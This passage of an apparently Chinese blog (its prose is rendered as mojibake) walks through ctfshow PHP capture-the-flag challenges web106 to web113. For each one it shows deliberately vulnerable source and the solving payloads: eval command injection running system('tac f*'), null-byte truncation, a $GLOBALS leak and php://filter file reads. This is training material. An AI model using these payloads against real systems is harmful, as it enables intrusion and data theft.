class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ¬ä½“ï¼Œæœ‰ç‚¹æ‡µï¼Œä½†æ˜¯å´æœ‰ä¸€ä¸ªå…³é”®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br></pre></td></tr></table></figure><p>å› æ­¤åªè¦æˆ‘ä»¬å¯ä»¥å¯¹$errorä¼ å‚å°±å¯ä»¥ä¼ å‡ºflagï¼›<br>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: ?a=flag   POST:  <span class="built_in">error</span>=a;</span><br></pre></td></tr></table></figure><p>é€šè¿‡getè¿›ä¸€ä¸ªå‚æ•°ä½¿ä»–ä¸ºflagï¼Œå¹¶å°†aèµ‹ç»™erroråˆ©ç”¨die()å‡½æ•°å¾—åˆ°flag</p><p>è¿˜æœ‰ä¸€ä¸ªpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suces=flag&amp;flag=  <span class="comment">//ä¸å¤ªç†è§£</span></span><br></pre></td></tr></table></figure><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 23:24:14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°é¢˜ç›®å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£parse_str()å‡½æ•°çš„æ„æ€</p><blockquote><p>parse_str(string,array)ï¼šstringä¸ºè§£æçš„å­—ç¬¦ä¸²ï¼Œarrayä¸ºå­˜å‚¨å˜é‡çš„æ•°ç»„çš„åç§°ã€‚è¯¥å‚æ•°æŒ‡ç¤ºå˜é‡å°†è¢«å­˜å‚¨åˆ°æ•°ç»„ä¸­</p></blockquote><p>å› æ­¤å¯ä»¥é€šè¿‡ä»¥ä¸‹è·¯å¾„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST v1=flag=<span class="literal">NULL</span>  GET ?v3[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>ä»è€Œå¾—åˆ°flag</p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 23:53:55</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="built_in">error</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡æœ¬é¢˜å¯ä»¥çœ‹åˆ°eregï¼ˆï¼‰å‡½æ•°è¯¥å‡½æ•°å¯ä»¥ç”¨%00æ¥æˆªæ–­<br>strrevï¼ˆï¼‰å­—ç¬¦ä¸²åè½¬<br>intvalï¼ˆï¼‰å–æ•´<br>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=a%<span class="number">00778</span></span><br></pre></td></tr></table></figure><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-29 22:02:34</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åªè¦æœ‰å­—æ¯ä¾¿å¯ä»¥ï¼Œå› æ­¤æ‰¾åˆ°ä¸ä¼šæŠ¥é”™çš„ç±»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span>  <span class="comment">// é”™è¯¯ç±»</span></span><br><span class="line">ReflectionClass</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="built_in">Exception</span>();system(<span class="string">&#x27;tac f*&#x27;</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line">v1=ReflectionClass&amp;v2=system(<span class="string">&#x27;tac f*&#x27;</span>)</span><br><span class="line">?v1=ReflectionClass(<span class="string">&quot;PDO&quot;</span>);system(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br></pre></td></tr></table></figure><p>ä¸­é—´é‚£ä¸ªï¼Œå¯ä»¥ä¸é—­åˆçš„åŸç†å°±æ˜¯å› ä¸ºå…ˆæ‰§è¡Œçš„systemï¼Œç„¶åæ‰æŠ¥çš„é”™ã€‚ä½ å¯ä»¥ç†è§£æˆphpinfo(system(â€œlsâ€));ï¼Œå…ˆæ‰§è¡Œçš„systemã€‚</p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-29 22:49:10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°é¢˜ç›®åå°±ä¼šå‘ç°ä¸Šé¢˜çš„è§£æ³•æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶ä¸èƒ½å‡ºç°ä¸Šé¢åŒ¹é…çš„å­—ç¬¦<br>çœ‹å¤§ä½¬åšå®¢å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span>()<span class="comment">//è¿™ä¸ªå‡½æ•°å¯ä»¥çš„åˆ°å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶æ“ä½œå¦‚ä¸‹</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$a</span>-&gt;valid())&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;getFilename().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$a</span>-&gt;next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶</span></span><br><span class="line"><span class="number">103</span>.php</span><br><span class="line">ssrf.php</span><br><span class="line">text.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› æ­¤åªè¦å‡ºç°â€˜.â€™ä¾¿å¯ä»¥å‡ºç°é¢˜è§£ï¼Œå¯¹äºç‚¹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨getcwdï¼ˆï¼‰å‡½æ•°æ¥æ›¿ä»£</p><blockquote><p>getcwd() ï¼šè·å–å½“å‰å·¥ä½œç›®å½•</p></blockquote><p>ä»è€Œè·å¾—è·¯å¾„<br>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="built_in">FilesystemIterator</span>&amp;&amp;v2=getcwd</span><br></pre></td></tr></table></figure><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 02:41:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿ$GLOBALSå˜é‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span> â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡</span><br><span class="line">ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c147bbde0c8c4eb58a7aba2f4843ebd3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é€šè¿‡å›¾ç‰‡å¯ä»¥çœ‹åˆ°è¯¥å˜é‡å¯ä»¥è¿”å›æˆ‘ä»¬å†™çš„å˜é‡ï¼Œé‚£æ˜¯ä¸æ˜¯åœ¨è¿™é“é¢˜ä¸­å¯ä»¥è¿”å›$flag!<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ctfshow&amp;&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ¬é¢˜çœ‹åˆ°è¿‡æ»¤çš„æ²¡æœ‰phpå’Œfilterå°±æƒ³åˆ°äº†phpä¼ªåè®®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_file â€” åˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶</span><br><span class="line">is_file ( <span class="keyword">string</span> <span class="variable">$filename</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯ä¸èƒ½è®©is_fileæ£€æµ‹å‡ºæ˜¯æ–‡ä»¶ï¼Œå¹¶ä¸” highlight_fileå¯ä»¥è¯†åˆ«ä¸ºæ–‡ä»¶ã€‚è¿™æ—¶å€™å¯ä»¥åˆ©ç”¨phpä¼ªåè®®ã€‚<br>å¯ä»¥ç›´æ¥ç”¨ä¸å¸¦ä»»ä½•è¿‡æ»¤å™¨çš„filterä¼ªåè®®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:file=php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">file=compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line">payload:file=php:<span class="comment">//filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="web-113"><a href="#web-113" class="headerlink" title="web 113"></a>web 113</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span 